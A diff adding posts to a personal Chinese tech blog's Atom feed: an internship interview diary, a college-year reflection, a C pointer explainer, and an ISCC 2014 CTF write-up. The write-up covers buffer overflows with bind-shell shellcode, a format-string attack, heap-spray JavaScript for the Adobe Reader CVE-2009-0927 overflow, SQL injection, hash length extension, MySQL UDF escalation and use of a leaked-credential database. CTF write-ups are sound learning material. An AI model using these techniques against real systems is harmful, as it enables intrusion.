@@ -2,13 +2,665 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://pikez.github.io</id>
     <title>Pikez</title>
-    <updated>2020-08-15T13:45:30.858Z</updated>
+    <updated>2020-08-15T14:25:07.487Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://pikez.github.io"/>
     <link rel="self" href="https://pikez.github.io/atom.xml"/>
     <logo>https://pikez.github.io/images/avatar.png</logo>
     <icon>https://pikez.github.io/favicon.ico</icon>
     <rights>All rights reserved 2020, Pikez</rights>
+    <entry>
+        <title type="html"><![CDATA[实习面试流水账]]></title>
+        <id>https://pikez.github.io/post/shi-xi-mian-shi-liu-shui-zhang/</id>
+        <link href="https://pikez.github.io/post/shi-xi-mian-shi-liu-shui-zhang/">
+        </link>
+        <updated>2016-03-30T14:10:59.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="蘑菇街">蘑菇街</h2>
+<h3 id="一面">一面</h3>
+<h4 id="自我介绍">自我介绍</h4>
+<ul>
+<li>工作室的情况介绍</li>
+<li>解决问题，同学们找我解决什么问题，对工作室整个运维工作的介绍，是不是我来推动这些事的</li>
+<li>Python 元组和列表的区别，简单</li>
+<li>深拷贝 浅拷贝没说得很清楚</li>
+<li>装饰器，这个比较了解</li>
+<li>对Django的了解，我说Flask熟悉的一逼</li>
+</ul>
+<h4 id="项目">项目</h4>
+<ul>
+<li>运维平台，说了说为什么要做这个东西，简单说了下架构</li>
+<li>Golang的使用经验</li>
+<li>实习经历。用zabbix干了啥，先用ansible去自动化部署，监控基本信息，对一些基本的信息监控，说到监控日志用shell 去处理，问日志大怎么办，我说没遇到过大的，都是每分钟几十的注册量这样的，他表示无奈。</li>
+</ul>
+<h4 id="其他">其他</h4>
+<ul>
+<li>对城市有没有选择，我说不虚，想到处走走</li>
+<li>说说自己的优缺点瞎扯一通，问成绩如何，专业成绩还可以，基础课程比较差</li>
+</ul>
+<h4 id="有什么问题">有什么问题：</h4>
+<p>1 蘑菇街的运维规模怎样？大叔回答很详细，刚和美丽说合并，运维团队十几个人，有专门做运维开发的，感觉前景也很不错<br>
+2 我还有什么要改进的？开发方向多熟悉，说我跟他性格很像<br>
+3 还有得面试没？<br>
+P.S：好久以后收到邮件。。。被拒。。</p>
+<p>##腾讯<br>
+###一面<br>
+一共10分钟，写毛线啊 😃</p>
+<ul>
+<li>简单介绍工作室情况</li>
+<li>说说运维做什么</li>
+<li>意向城市为什么是深圳</li>
+<li>说说自己做的东西</li>
+<li>说说自己的责任感体现在什么方面</li>
+</ul>
+<h2 id="华为">华为</h2>
+<h3 id="机试">机试</h3>
+<p>程序猿生涯第二次碰OJ，运气比较好吧，题目比较简单，最重要的是，可以用Python！！<br>
+一共三题，分别100，200，300分，够100分就算通过，可以参加面试和性格测试<br>
+结果第一题用Python，5行代码，两分钟就完了，然后慢慢磨后面的两题，然而测试用例没能过完，一共拿了310分。接着就是传说中特别坑爹，影响很大的性格测试，安安心心填吧，不是很在乎，对自己还是蛮有信心的。几天后收到面试通知</p>
+<h3 id="一面-2">一面</h3>
+<p>通知8:40到华为，一大早起床，还犹豫了下要不要骑车过去，毕竟3.6公里实在太近，最后还是放弃了。走在园区感觉真是大气和豪迈，竟然有一丝丝的向往。<br>
+到了面试地点，各种吃的，填填各种表格，华为果然把笔试题都打印出来了，看来要面试的时候问，交简历的时候问我：面C/C++还是JAVA，我：。。。。。<br>
+都不会面个锤子啊，我真的是想找运维岗的。。。还好对C还是有一定掌握，硬着头皮选了C/C++<br>
+面试官很和蔼，看着简历问了些项目相关的，又看我不会C++表示很蛋疼，于是让我说说Python，特性什么的，再和C比较，编译的步骤啥的，很基础，看我还会点C，于是让手写字符串反转，链表删除，都很基础。接着就是问学校的经历，说自己运维都做了什么，成绩怎么样，课程学什么，我说密码学什么的，又让我讲具体的加密方式。但看起来还是纠结我不会C++，他们全是C++和JAVA开发，于是让我写了两个脚本，于是说我比较适合测试，问有没有意愿，我想着反正都是来刷面试经验的，接着面吧，于是给我说先回学校，后面等通知面测试。。<br>
+刚出华为大门，HR一个电话打过来，让赶快回去面试，晕死。以为回去面测试呢，结果直接跟我说等着二面。</p>
+<h3 id="二面">二面</h3>
+<p>综合面试，满满的人格调查，从天问到地。<br>
+现场做智力题，问家庭背景，问生涯规划，问做人处事，问人生追求，问生活爱好，问成绩学业。。。<br>
+后来想想智力题把25+7加得27了好傻逼，说说印象比较深的问题：<br>
+让我说服他相信我很有潜力，一顿乱扯，天赋啊，毅力啊，经历啊，没想到自己还是很能扯的。。<br>
+看我写腾讯俱乐部主席和夏令营的事，一直问为什么不去腾讯和阿里什么，各种瞎编。。。<br>
+最后就是问成绩的事。。还挂着科真的好虚，各种给自己圆。。。<br>
+一直比较放松，经常讲出让面试官笑的话。。。</p>
+<h3 id="总结">总结</h3>
+<p>面试当天看到的几本都是研究生，两个面试官都对自己是本科生很新奇，压力好大。。<br>
+技术面还是比较常规，有点偏重项目经历，综合面感觉好压抑，真的考察容不容易洗脑吧。。<br>
+四天后收到offer</p>
+<h2 id="网易">网易</h2>
+<p>网易实习生招聘里并没有运维相关的岗位，于是就在16届的春招里找了系统运维工程师的试试，后来正常的收到了笔试通知，挺高兴的以为有戏，做吧</p>
+<h3 id="笔试">笔试</h3>
+<p>第一次在线笔试，看到是运维工程师专门出的题目，心里一激动，扫了一遍题目，暗自高兴啊，基本全会<br>
+网易果然务实，选择题都很基础，TCP/IP，C，Linux，数据库，操作系统，Shell都有，做得很爽<br>
+大题还是比较开放，三题都是网络相关的，TCP拥塞控制和MAC地址相关，比较轻松<br>
+一题开放性的题目比较考人，两道编程题用Python压力并不大。<br>
+最终感觉做得很不错，基本全会全做了</p>
+<h3 id="面试">面试</h3>
+<p>收到面试通知要去杭州网易，由于自己投的是春招岗位，不是很确定最后能不能以实习生的名义去，刚好HR打电话过来问能不能去面试，说明情况后抱歉了，欢迎我秋招再去，遂了结。</p>
+<h2 id="折800">折800</h2>
+<p>还是为了刷经验。坐俩小时车磨到公司，一看环境，比暑假实习的公司要烂啊，前台都没人，感觉好无奈，但后来认识到不能以貌取人，公司还是可以的</p>
+<h3 id="笔试-2">笔试</h3>
+<p>一套逻辑题，难度不大，就是烦，没有耐心，一个个分析，感觉都能对，一共12个最后才拿了8分<br>
+一套专业题，一共5道大题都很基础，数组倒序，反转链表，SQL查询，TOP k问题，最后一个用前后指针求和的问题（描述不清楚）试卷上都用的JAVA开头，被我直接划了用C和Python各种写。。。<br>
+都做完以后感觉今天问题已经不大了</p>
+<h3 id="一面-3">一面</h3>
+<p>做运维架构设计的来面，好年轻好帅。。。<br>
+看了笔试情况我估计他也没啥好问的，就着简历简单过了一遍，着重说了自己对自动化运维感兴趣，扯到了Python，他问我除了Python本身的优点，其他什么驱使你用Python，当时觉得很诡异，讲道理的话一般不希望单纯对语言感兴趣而用，但是后来理解了，现在市场上培训太多了，都是为了学而学，他希望的是我纯粹喜欢Python而用，刚好我确实是这样，又谈了谈对自动化运维的各种理解，他一直在说平时遇到的问题，我都好好听着以为要让我回答呢，结果他只是给我说说，全程都是他在教我各种东西。。哈哈哈<br>
+说到折800每天500万uv，日订单量超过唯品会聚美，100万单什么的，500+的服务器，用的node和ruby什么的感觉蛮小清新的，对线上用node的还是挺佩服的<br>
+又给我说说他们运维的情况，问问我想做哪些方面，分析了下行情<br>
+顺便就说到对服务器优化也感兴趣，让说说该怎么做，从CPU，内存，磁盘，网络随便说了一说，感觉他就很满意了。。拿了套社招的Python题给我做，都是一些语法和特性，内存管理什么的，都写了写。完了就表示很希望我考虑加入他们</p>
+<h3 id="二面-2">二面</h3>
+<p>技术主管面，也没啥问题，问问对运维的理解，我说了说自己体会到的应该有的一些责任感啊，细心啊，稳重啊什么的<br>
+想做的方向，让我说说对哪些地方可以自动化运维，我说了测试流程和配置管理，他给我理了一遍整个流程，从服务器上架到最终的服务，都可以做的自动化运维，很长见识。<br>
+最后问问题阶段，问了下怎么老问我开发方向的问题，我TCP/IP，操作系统，数据库都掌握得挺好的啊，都没人问我，他说现在工作都细化了，运维里都分出了网络，DBA，系统等等，所以不要求全会，但掌握了是加分项。。。果然不是大公司那样重基础。。。</p>
+<h3 id="三面">三面</h3>
+<p>HR面，刚好管校园招聘的HR不在，另一个来问问基本情况，没啥好说的，我还赶着晚上回去坐360笔试呢，头疼得不行，草草了事滚蛋</p>
+<h3 id="总结-2">总结</h3>
+<p>算拿到offer了吧，准备看看提前去实习</p>
+<p>##云巴科技</p>
+<h3 id="一面-4">一面</h3>
+<p>提前预约好时间然后视频面试，全程都问简历上的东西。<br>
+上来就让介绍实习的经历，简单按简历上的理了一遍，问了下监控脚本都做了什么，然后就是Zabbix的api开发是干什么的<br>
+接着就问工作室的运维情况，问持续集成，按自动化发布的流程回答；接着问网络优化，从代理缓存和多口线路说；<br>
+开始问项目。运维平台是干什么的，依旧从出发点和解决的问题来回答了。着重问了Golang写的爬虫，先让说说什么是并发，就从Go来说，我从语言层面和实现稍微说了一下，然后问爬虫的难点在哪，先说了下自己开始写并发各部件间的协调，然后就是针对应用场景的反反爬虫策略，举了下搜狗的反爬虫规则和去处理的案例。<br>
+最后问对运维苦逼这个说法的看法，这个就好办了，毕竟自己喜欢。</p>
+<h3 id="二面-3">二面</h3>
+<p>HR面，估计是交叉面吧，后面还有技术面，简单说说个人情况而已</p>
+<h3 id="三面-2">三面</h3>
+<p>CEO面，第一次有些压力，一下课就跑回家等着，结果CEO开会耽搁了一会。<br>
+上来就给人一种霸气的感觉，也是具体问了简历相关的东西，运维平台，爬虫。<br>
+爬虫问了写的目的，和一面差不多，主要问了怎么处理JS的动态数据，因为现在很多页面都是动态获取数据的，但我的实际运用比较少，都是单独去分析JS的接口然后抓数据，他告诉我有命令行的工具来<br>
+运维平台问了我怎么写的，具体说了下架构，怎么处理数据可视化，没办法自己前端水平太挫。让举些市面上可视化监控的例子，也有些了解。<br>
+问了的具体技术不多，Linux下的流量统计，回答的总的流量统计，但没想想起来每个IP怎么去统计，后来提示可以用iptables做日志，顺便iptables的话题，问了NAT原理，探讨了一下实现机制呢<br>
+因为看过对CEO的访谈，就问了下对优秀工程师的看法</p>
+<h3 id="总结-3">总结</h3>
+<p>通知Offer了，让回馈实习时间，很想4月就去，可是事情太麻烦了，留到暑假的机会吧。</p>
+<h2 id="宜信">宜信</h2>
+<h3 id="笔试-3">笔试</h3>
+<p>在线笔试，和360一个系统吧好像，全是JAVA题目，基本不会，各种猜，编程题目不是很难，但是得用C写，做出来一个，还是过了笔试。</p>
+<h3 id="一面-5">一面</h3>
+<p>电话面试，事先通知了一个网址，在线直播写代码。。。慌得不行，自己写代码总是不会写变量名。。好绝望的说。<br>
+先自我介绍吧，才发现自己的简历一直没写什么学院和专业好坑。。然后介绍自己学过的课程。然后就写代码了。。。<br>
+首先一个很简单的C语言的入门，打印三角形的星号！！！而我竟然没有完整的写出来！！真是丢人，面试官估计不太想等，说了下思路就让过了。接着写一个判断链表有没有环，这个基础了，直接写了函数，也没办法测试，又过了。接着设计的问题，没答出来很蛋疼。<br>
+告一段落，开始问基础啦！！这么多面试终于等到啦！！进程与线程的区别，直接结合实际来讲，面试官很满意的样子。接着就是OSI模型，TCP，UDP区别，三次握手这些，简直滚瓜烂熟。再接着Linux方面的，shell，查进程，备份日志等，都很简单。<br>
+技术问题差不多了，让说说下职业规划，自己还是很明确，然后一个处理工作问题的案例，有一个会议要准备，有分配了紧急事情要处理，该怎么办。简直太擅长处理这种问题了，答完后面试官很满意，让等HR面咯。一个小时结束。</p>
+<h3 id="二面-4">二面</h3>
+<p>二面通知在学校的教室面得，我是第一个9点去到哪人影都没有，打电话给HR等了会，然后就开始啦<br>
+一个工程师来面试的，对前面的面试情况完全不了解，感觉这点很不专业。边看简历上的东西边问问题，问的也不多，Linux的命令，让在纸上一直写，在工作室做的事情：对网络的规划，对自动化运维的实践，出了一个问题，就是突然断网该怎么办，让出各种情景下的方案，答得不是很好。然后就问了对运维工作内容的理解。<br>
+刚面完，旁边的HR姐姐突然问我，你是不是有个师兄叫王瑾，突然就懵了，真的是他吗。。又问了一遍确认。。果然，中午瑾师兄还要请他们吃饭呢，这下好了，大家都是熟人了（强行熟。。）然后在面试官写面试评价的时候一直和HR姐姐聊天，各种扯。</p>
+<h3 id="三面-3">三面</h3>
+<p>主管面吧，负责宜信技术研发中心的主管之一，简单的自我介绍，然后就给我介绍宜信的各种业务啊技术中心的情况啊职业发展啊，随即就问我一些常见的问题，考研，女朋友，工作城市，对运维的定位等等，都很好说一顿扯。</p>
+<h3 id="总结-4">总结</h3>
+<p>拿到offer，下午师兄跟这批人吃完饭以后给我说，那个主管对我评价特别高，让我好好加油，多尝试几家公司，哈哈。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[大二下学期总结]]></title>
+        <id>https://pikez.github.io/post/da-er-xia-xue-qi-zong-jie/</id>
+        <link href="https://pikez.github.io/post/da-er-xia-xue-qi-zong-jie/">
+        </link>
+        <updated>2015-07-14T14:21:55.000Z</updated>
+        <summary type="html"><![CDATA[<p>简单粗暴的标题，可以啰啰嗦嗦写一大篇，也可以用一个字来总结，忙忙忙忙忙忙（重复一万次</p>
+]]></summary>
+        <content type="html"><![CDATA[<p>简单粗暴的标题，可以啰啰嗦嗦写一大篇，也可以用一个字来总结，忙忙忙忙忙忙（重复一万次</p>
+<!-- more -->
+<h2 id="关于学业">关于学业</h2>
+<p>实际上是从上学期开始，整个人已经完全浪了，心中无课便无课。来到大学就没打算在课堂上学到什么知识，体会各种老师的气质和眼界才是想要的。怀念起黄桃，周益民这样的男神老师，还好又多了一个王晓敏这样的女神老师。毕业那天，会后悔逃过的课么。</p>
+<p>大学以来第一次没有挂科，各种小伙伴考前考后甚至考试中带我飞~~可是还有两科重修过不了，有点小慌，得抓紧了。</p>
+<h2 id="关于技术">关于技术</h2>
+<p>前两个月基本忙写运维平台，集各种系统，Web后台，前端，网络开发为一体，造就一个复杂度240的作品（正常应该在10以下。。），自然成为了一个半成品。感觉自己难成为一名优秀的研发，没办法一直坚持写代码。然后继续研究Linux，走的弯路比较多，就是个折腾吧。</p>
+<p>完完整整看完的书只有几本《Python自动化运维》《构建高性能Web站点》《Flask Web开发》《Go并发编程》，浏览过的书不计其数，模模糊糊只留下些印象，还是应该做好读书笔记，把博客和wiki给补回来。</p>
+<p>还算顺利得找到了实习，投了好几家公司，最想去实验楼做Linux运维开发结果晚了一步，接着过了Testbird和陌陌，担心自己挂科和学校的乱七八糟的事情，选择留在了成都，明年再出去走走吧。</p>
+<h2 id="另外一些学习">另外一些学习</h2>
+<p>大二这一年是我成长最多最快的一年，因为太多没经历过的事情摆在面前必须一件件去做。</p>
+<p>带俱乐部最大的收获是必须面对各种人，腾讯的各种工程师，经理，学校各种部门，起码交流能力有一定提高吧。俱乐部亮点不多但也算过得去，办好了每一个活动，必须感谢大家的帮助和支持。</p>
+<p>来到标记里也半年出头了，当初被詹师兄忽悠进来，现在只想感谢他，估计他是这所大学里最看得起我的老师，逢人必把我夸的天花乱坠，真是没脸了~~经历了工作室的变迁合并，大家也都乱成一团，不过都是为了更好的发展，不得不吐槽运维最苦逼，好处没有，背锅永远第一选择。。</p>
+<p>第一次带项目，麻烦事情简直不要太多， 伴随各种折腾和自我安慰，让我现在看见需求两个就颤抖。也没想到这是工作室这学期唯一的项目。</p>
+<p>会逃避难以面对的事，最忙的情况下还能放下心情和基友们LOL，只是逃避现实而已。仅仅只有搞定一切技术问题的信心。</p>
+<h2 id="关于友情">关于友情</h2>
+<p>开始对任何离别感到伤心，哪怕只是短暂不见。一年下来的经历让我把朋友放到了最重要的位置，会珍惜每一个能相处的人。</p>
+<p>感觉自己是个长不大的人，老是依靠别人，所以也不知道怎么和自己的小的人相处，快到大三渐渐体会当学长的感觉，能够为学弟学妹做一些事，甚至做某些方面的榜样。</p>
+<p>特别提一下张x正，因为咱俩的关系太微妙，可以无话不说无事不做，原来同性之间能要好到这种程度而没有任何的麻烦，所以我竟然能理解同性恋了。</p>
+<h2 id="关于亲情">关于亲情</h2>
+<p>很愧疚，表妹中考前一天我才给了她鼓励，太晚了，这就是我对亲情后知后觉的一个展现吧。</p>
+<p>最难过的是爸妈的关系越来越不好，却无能为力，没想到已经可以淡定地对他们说无论做出什么决定我都不反对，这是所谓的长大还是冷漠，我不知道，只是不想再看到一点不合。那段时间，每天早上7点出门，11点回去，然后坐在楼道口，静静的听妈妈或爸爸在电话里抱怨和哭诉，那种无力感真令人崩溃，恨不得自己能撑住一切。</p>
+<h2 id="关于爱情">关于爱情</h2>
+<p>呃，好像并没有资格写这一部分</p>
+<h2 id="乱七八槽的体验">乱七八槽的体验</h2>
+<p>酒真的是个好东西，醉了更痛快。</p>
+<p>被太多人当做弯的，无所谓。</p>
+<p>享受被人看得起的感觉，看贬自己的还是自己。</p>
+<p>充斥各种无力和疲累，希望下一学期不要再这样了。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[C函数参数的传递]]></title>
+        <id>https://pikez.github.io/post/c-han-shu-can-shu-de-chuan-di/</id>
+        <link href="https://pikez.github.io/post/c-han-shu-can-shu-de-chuan-di/">
+        </link>
+        <updated>2015-07-12T14:00:45.000Z</updated>
+        <summary type="html"><![CDATA[<p>最近萌萌的女票在学C语言，刚好又被指针给虐了，而我顺带也被虐了，赶快看看书帮她虐回去。</p>
+]]></summary>
+        <content type="html"><![CDATA[<p>最近萌萌的女票在学C语言，刚好又被指针给虐了，而我顺带也被虐了，赶快看看书帮她虐回去。</p>
+<!-- more -->
+<pre><code>void swap1(int *p, int *q)
+{
+    int t;
+    t = *p;
+    *p = *q;
+    *p = t;
+}   
+void swap2(int *p, int *q)
+{
+    int *t;
+    t = p;
+    p = q;
+    q = t;
+}
+int main()
+{
+    int a, b, *p, *q;
+    p = &amp;a;
+    q = &amp;b;
+    scanf(&quot;%d %d&quot;, &amp;a, &amp;b);
+    printf(&quot;before swap p:%p, q:%p\n&quot;, &amp;p, &amp;q);
+    swap2(p, q);
+    printf(&quot;after swap p:%p, q:%p\n&quot;, &amp;p, &amp;q);
+    printf(&quot;%d %d&quot;, a, b);
+}
+</code></pre>
+<p>这是让她不得其解的代码，为什么swap2不能成功交换两个元素的值，都传的地址呀。然而大多数国内教材上的说法：函数传参有传值和传址两种方式。</p>
+<p>都是错的或者说表述不清楚。</p>
+<p>C函数的所有参数均以“传值调用”方式进行传递，也就是每个参数都是拷贝。<br>
+看一下调用swap2前后的指针地址</p>
+<pre><code>1 2
+before swap p:0x7fff5d6069e0, q:0x7fff5d6069d8
+swap2: p:0x7fff5d6069ec, q:0x7fff5d6069e8
+swap2: p:0x7fff5d6069e8, q:0x7fff5d6069ec
+after swap p:0x7fff5d6069e0, q:0x7fff5d6069d8
+1 2
+</code></pre>
+<p>swap2的流程如下:</p>
+<p>首先复制了一份p和q，这份p和q仅在函数内存在，可以看到和函数外的p，q并不相同，但他们的值都是a和b的地址，但是内部声明了一个指针变量，所以交换的是函数内部指针本身的地址，在函数返回后，原指针没有发生变化，所以交换不成功。</p>
+<p>而swap1的流程：</p>
+<p>声明了一个int变量，交换时取出了指针所指向的值，改变了指针保存的地址的所指向的值（好拗口），虽然这两个指针也是复制的，但指向的地方和外部一样，交换才能成功。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[ISCC2014 总结&writeup(二)]]></title>
+        <id>https://pikez.github.io/post/iscc2014-zong-jie-and-writeuper2/</id>
+        <link href="https://pikez.github.io/post/iscc2014-zong-jie-and-writeuper2/">
+        </link>
+        <updated>2014-10-15T13:53:43.000Z</updated>
+        <summary type="html"><![CDATA[<p>web和pwn部分的writeup。pwn溢出以前没接触过，这次玩图书馆借了基本书来来回回琢磨了一下，算是入门了，以后再找机会学点高级点的技术，绕过DEP，ALSR等等。web题感觉注入太多了，来来回回几个注入，不太有劲::&gt;_&lt;::。</p>
+]]></summary>
+        <content type="html"><![CDATA[<p>web和pwn部分的writeup。pwn溢出以前没接触过，这次玩图书馆借了基本书来来回回琢磨了一下，算是入门了，以后再找机会学点高级点的技术，绕过DEP，ALSR等等。web题感觉注入太多了，来来回回几个注入，不太有劲::&gt;_&lt;::。</p>
+<!-- more -->
+<h3 id="pwn">PWN</h3>
+<ul>
+<li><strong>斗克之乱</strong></li>
+</ul>
+<figure data-type="image" tabindex="1"><img src="http://zend3.qiniudn.com/Blog-ISCC13.png" alt="13" loading="lazy"></figure>
+<p>看到程序运行后肯定是绑定了端口的，查看端口后，打开IDA动态调试后，用python写脚本进行连接，然后发送AA……无效字符来反复触发异常直到定位到异常位置</p>
+<figure data-type="image" tabindex="2"><img src="http://zend3.qiniudn.com/Blog-ISCC38.png" alt="38" loading="lazy"></figure>
+<p>然后看到前面的这个函数给了缓冲区64(40H=60)个字节，将数据处理后多余的字符就覆盖了后面，因为有4个字节弹出到了ebp，再后面4个字节才是eip，所以<br>
+在64+4=68后放入shellcode便可以控制流程了。</p>
+<p>找到一个可以打开4444端口的shellcode，写入并连接</p>
+<figure data-type="image" tabindex="3"><img src="http://zend3.qiniudn.com/Blog-ISCC24.png" alt="24" loading="lazy"></figure>
+<p>运行exp.py后，telnet 127.0.0.1 4444 得到cmd</p>
+<ul>
+<li><strong>改革国政</strong></li>
+</ul>
+<figure data-type="image" tabindex="4"><img src="http://zend3.qiniudn.com/Blog-ISCC14.png" alt="14" loading="lazy"></figure>
+<p>此处读入文件并加入wron后打印出来，猜测可能是格式化字符串漏洞，printf（buf）的形式</p>
+<figure data-type="image" tabindex="5"><img src="http://zend3.qiniudn.com/Blog-ISCC20.png" alt="20" loading="lazy"></figure>
+<p>先定位当前的输出点</p>
+<figure data-type="image" tabindex="6"><img src="http://zend3.qiniudn.com/Blog-ISCC19.png" alt="19" loading="lazy"></figure>
+<p>然后把AAAA改为wron的位置,接着把eax修改为ISCC的十六进制0x49534343，倒过来是0x43435349，转为十进制为1128485503。(减去已有的196，为1128485307），通过%x来改写eax的大小。</p>
+<figure data-type="image" tabindex="7"><img src="http://zend3.qiniudn.com/Blog-ISCC25.png" alt="25" loading="lazy"></figure>
+<p>把eax这个数值放进原来wron的位置，就能改写wron。</p>
+<figure data-type="image" tabindex="8"><img src="http://zend3.qiniudn.com/Blog-ISCC29.png" alt="29" loading="lazy"></figure>
+<ul>
+<li><strong>远征郑国</strong></li>
+</ul>
+<p>找到读取key并验证那段代码，猜测存在溢出</p>
+<figure data-type="image" tabindex="9"><img src="http://zend3.qiniudn.com/Blog-ISCC15.png" alt="15" loading="lazy"></figure>
+<p>通过调试和尝试，发现136字节刚好充满缓冲区，溢出后覆盖地址</p>
+<p>需要个弹窗ISCC，如果包含00等字符会被截断而不执行，所以写的时候避免0参数的压入</p>
+<p>由于是从文本读入，直接输入shellcode无法正确转义，所以提取机器码后写几行python脚本处理一下</p>
+<figure data-type="image" tabindex="10"><img src="http://zend3.qiniudn.com/Blog-ISCC26.png" alt="26" loading="lazy"></figure>
+<figure data-type="image" tabindex="11"><img src="http://zend3.qiniudn.com/Blog-ISCC30.png" alt="30" loading="lazy"></figure>
+<ul>
+<li><strong>镇压叛乱</strong></li>
+</ul>
+<p>在看雪出的《0day安全 软件漏洞分析技术》一书中30章对CVE-2009-0927 adobe reader的溢出漏洞进行了分析，就学习了下下</p>
+<figure data-type="image" tabindex="12"><img src="http://zend3.qiniudn.com/Blog-ISCC16.png" alt="16" loading="lazy"></figure>
+<p>这里，直接把原字符串的长度放入了strncpy的第三个参数，相当于strcpy了，所以造成了溢出。</p>
+<p>大体思路为：通过填充getIcon()函数触发异常，同时覆盖程序SEH指针，再通过堆喷射把0x0c0c0c0c指向的地方填充nop和shellcode。</p>
+<p>首先来创建一个pdf文档，格式很常见，用wps建个空文档保存为pdf格式就行。然后把第七个对象js保存的地方进行修改。</p>
+<p>先构造堆喷射。</p>
+<p>​</p>
+<pre><code>var  nops = unescape(&amp;quot;%u9090%u9090&amp;quot;);
+
+while (nops.length &amp;lt; 0x10000)
+
+nops += nops;       //足够数量的nop
+
+nops = nops.substring(0,0x10000-16-shellcode.length);  //16为BSTR对象的头信息
+
+nops = nops + shellcode;
+
+var memory = new Array();
+
+for (var i=0;i &amp;lt; 1024;i++)  //分配堆，1024块
+
+memory[i] += nops;
+
+var str = unescape(&amp;quot;%0c%0c%0c%0c&amp;quot;);   //触发后跳到的地方
+
+while (str.length &amp;lt; 0x6000)
+
+str += str;
+
+app.doc.Collab.getIcon(str+'aaaaD.Zend');   //放入问题函数
+</code></pre>
+<p>接下来就是构造shellcode的问题，先前写过xp sp3下的cmd shellcode</p>
+<p>写个python把他转换为unicode的形式，见附件。</p>
+<p>最后写进js里面，就搞定了</p>
+<figure data-type="image" tabindex="13"><img src="http://zend3.qiniudn.com/Blog-ISCC21.png" alt="21" loading="lazy"></figure>
+<h3 id="web">WEB</h3>
+<ul>
+<li><strong>霸业蓝图</strong></li>
+</ul>
+<p>一开始没只想着是不是伪造个图片马然后拿key，试了下行不通，然后继文哥提示了我一下，反应过来数据有输出点而且在网页内，很有可能是XSS，于是修改图片EXIF信息为XSS，上传后Flag就到手</p>
+<figure data-type="image" tabindex="14"><img src="http://zend3.qiniudn.com/Blog-ISCC17.png" alt="17" loading="lazy"></figure>
+<blockquote>
+<p>Flag： 19ojep03</p>
+</blockquote>
+<ul>
+<li><strong>君臣论证</strong></li>
+</ul>
+<p>首先看到题目就蛋疼的看了下每月的内容，因为是查询工具，所以很容易想到是注入。</p>
+<figure data-type="image" tabindex="15"><img src="http://zend3.qiniudn.com/Blog-ISCC22.png" alt="22" loading="lazy"></figure>
+<p>到了这里，在月份后面加上单引号错误，于是开始手注（结合后面的xiaoming的表名）。</p>
+<figure data-type="image" tabindex="16"><img src="http://zend3.qiniudn.com/Blog-ISCC27.png" alt="27" loading="lazy"></figure>
+<blockquote>
+<p>Flag ： 9xme0siv2</p>
+</blockquote>
+<ul>
+<li><strong>火眼金睛</strong></li>
+</ul>
+<p>题目说了个“veryCD永垂不朽”用户，于是到社工库（594sgk）查到了信息，登录后台后看到一幅图，打开后有了该页面的代码</p>
+<pre><code>$auth = false;
+if (isset($_COOKIE['auth']))
+{
+
+    $auth = unserialize($_COOKIE['auth']);
+
+    $hsh = $_COOKIE['hsh'];
+
+    if ($hsh !== md5($SECRET . strrev($_COOKIE['auth'])))
+    {
+        //$SECRET is a 8-bit salt
+        $auth = false;
+    }
+}
+else
+{
+    $auth = false; $s = serialize($auth);
+    setcookie('auth';, $s);
+    setcookie('hs';, md5($SECRET . strrev($s)));
+}
+</code></pre>
+<p>继文哥告诉我是长度扩展攻击，研究大半天后搞到了hash值,</p>
+<p>4221c14a2bc59a3c2998a531ff7cb929，利用这个到了admin页面，提示post me some id！ 于是乎burp操起，注入。</p>
+<figure data-type="image" tabindex="17"><img src="http://zend3.qiniudn.com/Blog-ISCC31.png" alt="31" loading="lazy"></figure>
+<p>用管理员帐号密码登录后看到一张图片，打开图片找到flag</p>
+<figure data-type="image" tabindex="18"><img src="http://zend3.qiniudn.com/Blog-ISCC33.png" alt="33" loading="lazy"></figure>
+<blockquote>
+<p>Flag：I_AM_A_VERY_SMART_ADMIN_LOL</p>
+</blockquote>
+<ul>
+<li><strong>老马识途</strong></li>
+</ul>
+<figure data-type="image" tabindex="19"><img src="http://zend3.qiniudn.com/Blog-ISCC34.png" alt="34" loading="lazy"></figure>
+<p>看到这个页面就马上去看了http消息头，果然发现了密码，因为只有3秒钟，手动肯定来不及，所以用python写了个脚本搞定。</p>
+<pre><code>import httplib,urllib,urllib2
+
+import hashlib
+
+header = {'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) \
+
+Chrome/33.0.1750.117 Safari/537.36','cookie':'ASPSESSIONIDCQRTRCRR=IHFPCCDDEBLFJOAJLHMADILO&amp;', \
+
+}
+
+url = 'script2.iscc.org.cn'
+
+conn = httplib.HTTPConnection(url)
+
+conn.request('ge','/web07_e3a95260b7271954aa59460c134cde7e/')
+
+res = conn.getresponse()
+
+password = res.getheaders()[9][1]
+
+m = hashlib.md5()
+
+m.update(password)
+
+md5pass = m.hexdigest().upper()
+
+params = urllib.urlencode({'pwd': md5pass, 'Submit':'提交' })
+
+conn2 = httplib.HTTPConnection(url)
+
+conn2.request('POST', '/web07_e3a95260b7271954aa59460c134cde7e/index.asp?
+action=Check', params, header)
+
+response = conn2.getresponse()
+
+print response.read()
+</code></pre>
+<blockquote>
+<p>Flag：W3b_Pr0Gr4m1ng@_@</p>
+</blockquote>
+<ul>
+<li><strong>首次会盟</strong></li>
+</ul>
+<p>下载附件发现是udf.dll，mysql提权思路吧，由于虚拟机里的mysql版本较高，只能把dll文件放进 /lib/plugin里才能运行。</p>
+<pre><code>create function getkey returns string soname ‘udf.dll’
+
+select getkey()
+</code></pre>
+<blockquote>
+<p>Flag: U_Will_Use_Udf_In_Final_Challenge@2012</p>
+</blockquote>
+<ul>
+<li><strong>霸业初成</strong></li>
+</ul>
+<figure data-type="image" tabindex="20"><img src="http://zend3.qiniudn.com/Blog-ISCC35.png" alt="35" loading="lazy"></figure>
+<p>进去看见这个页面，马上加了’ 试试，有过滤，以为是绕过滤呢，试了大半天，然后才知道可以试试cookie传参数</p>
+<figure data-type="image" tabindex="21"><img src="http://zend3.qiniudn.com/Blog-ISCC36.png" alt="36" loading="lazy"></figure>
+<p>能正常返回，接着就是构造语句拿flag</p>
+<figure data-type="image" tabindex="22"><img src="http://zend3.qiniudn.com/Blog-ISCC37.png" alt="37" loading="lazy"></figure>
+<blockquote>
+<p>Flag：CaiBuDaoDeMiMa</p>
+</blockquote>
+<ul>
